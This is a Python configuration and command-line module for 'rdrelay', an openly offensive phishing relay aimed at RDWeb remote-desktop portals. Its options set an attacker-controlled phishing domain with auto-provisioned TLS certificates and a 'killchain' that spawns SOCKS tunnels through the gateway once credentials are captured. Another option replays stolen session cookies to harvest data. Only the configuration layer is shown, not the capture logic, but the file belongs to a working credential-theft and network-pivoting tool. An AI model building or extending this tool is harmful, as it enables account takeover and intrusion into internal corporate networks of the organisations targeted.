"""Configuration and CLI argument parsing."""
import argparse
import os
from dataclasses import dataclass, field
from urllib.parse import urlsplit


@dataclass
class Config:
    target: str = ""
    target_host: str = ""
    target_port: int = 443
    target_scheme: str = "https"
    target_aliases: list = field(default_factory=list)
    bind: str = "0.0.0.0"
    port: int = 443
    phish_domain: str = "localhost"
    no_tls: bool = False
    cert: str = ""
    acme_staging: bool = False
    out_dir: str = ""
    session_ttl: int = 3600
    no_killchain: bool = False
    socks_port_base: int = 1080
    harvest: bool = True
    verbose: bool = False

    @property
    def attacker_scheme(self):
        return "http" if self.no_tls else "https"

    @property
    def attacker_origin(self):
        default = 80 if self.no_tls else 443
        if self.port != default:
            return "%s://%s:%d" % (self.attacker_scheme, self.phish_domain, self.port)
        return "%s://%s" % (self.attacker_scheme, self.phish_domain)

    @property
    def upstream_origin(self):
        if self.target_port not in (80, 443):
            return "%s://%s:%d" % (self.target_scheme, self.target_host,
                                   self.target_port)
        return "%s://%s" % (self.target_scheme, self.target_host)


def parse_args(argv=None):
    ap = argparse.ArgumentParser(
        prog="rdrelay",
        description="RDWeb relay — phish-to-internal-VPN in one step")
    ap.add_argument("--target", required=True,
                    help="real portal URL, e.g. https://rds.corp.com")
    ap.add_argument("--target-alias", action="append", default=[],
                    help="additional upstream hostname to rewrite (repeatable)")
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--phish-domain", required=True,
                    help="attacker-controlled domain (DNS must point here)")
    ap.add_argument("--no-tls", action="store_true",
                    help="plain HTTP (lab testing only)")
    ap.add_argument("--cert", default="",
                    help="PEM file (cert+key); omit to auto-provision via "
                         "Let's Encrypt ACME (needs port 80 + DNS)")
    ap.add_argument("--acme-staging", action="store_true",
                    help="use Let's Encrypt staging (avoids rate limits)")
    ap.add_argument("--out", dest="out_dir", default="./rdrelay-data",
                    help="output directory for sessions/certs/artifacts")
    ap.add_argument("--session-ttl", type=int, default=3600)
    ap.add_argument("--no-killchain", action="store_true",
                    help="do NOT auto-spawn TSGU SOCKS on credential capture")
    ap.add_argument("--socks-port", type=int, default=1080,
                    help="base SOCKS port (each session gets base+n)")
    ap.add_argument("--no-harvest", dest="harvest", action="store_false",
                    help="do not replay cookies to harvest the feed")
    ap.add_argument("-v", "--verbose", action="store_true")
    a = ap.parse_args(argv)

    t = urlsplit(a.target if "://" in a.target else "https://" + a.target)
    if not t.hostname:
        ap.error("--target must include a host")

    return Config(
        target=a.target,
        target_host=t.hostname,
        target_port=t.port or 443,
        target_scheme=t.scheme or "https",
        target_aliases=a.target_alias,
        bind=a.bind, port=a.port, phish_domain=a.phish_domain,
        no_tls=a.no_tls, cert=a.cert,
        acme_staging=a.acme_staging,
        out_dir=os.path.abspath(a.out_dir),
        session_ttl=a.session_ttl,
        no_killchain=a.no_killchain,
        socks_port_base=a.socks_port,
        harvest=a.harvest,
        verbose=a.verbose,
    )
